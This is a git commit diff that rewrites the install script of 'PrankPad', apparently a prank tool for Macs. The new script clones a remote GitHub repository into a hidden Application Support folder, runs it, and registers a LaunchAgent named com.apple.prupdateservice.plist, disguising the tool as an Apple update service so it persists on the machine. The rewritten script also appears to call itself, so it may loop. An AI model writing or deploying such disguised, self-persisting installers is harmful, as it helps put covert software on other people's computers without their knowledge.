43d9cecfb34813e4a2013091ca2d5d954f2e8578
David Li <davidli@cs.stanford.edu>
2014-06-15 22:12:29 -0700

    Fixed install script

--- bootstrap/install.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/sh
-
-mkdir -p $HOME/Library/LaunchAgents/
-
-launchctl unload $HOME/Library/LaunchAgents/com.apple.prupdateservice.plist
-cp com.apple.prupdateservice.plist $HOME/Library/LaunchAgents/
-launchctl load $HOME/Library/LaunchAgents/com.apple.prupdateservice.plist
-
-echo "PrankPad Successfully Installed"
--- install.sh
+++ install.sh
@@ -1,5 +1,16 @@
 #!/bin/sh
 
-rm -rf $HOME/Library/Applicaton\ Support/PrUpdateService
-git clone https://github.com/pranksrus/prankpad.git $HOME/Library/Applicaton\ Support/PrUpdateService
-$HOME/Library/Applicaton\ Support/PrUpdateService/bootstrap/install.sh
+PROGDIR="$HOME/Library/Application Support/PrUpdateService"
+LAUNCHDIR="$HOME/Library/LaunchAgents"
+
+rm -rf "$PROGDIR"
+git clone https://github.com/pranksrus/prankpad.git "$PROGDIR"
+"$PROGDIR/install.sh"
+
+mkdir -p "$LAUNCHDIR"
+
+launchctl unload "$LAUNCHDIR/com.apple.prupdateservice.plist"
+cp "$PROGDIR/bootstrap/com.apple.prupdateservice.plist" "$LAUNCHDIR"
+launchctl load "$LAUNCHDIR/com.apple.prupdateservice.plist"
+
+echo "PrankPad Successfully Installed"
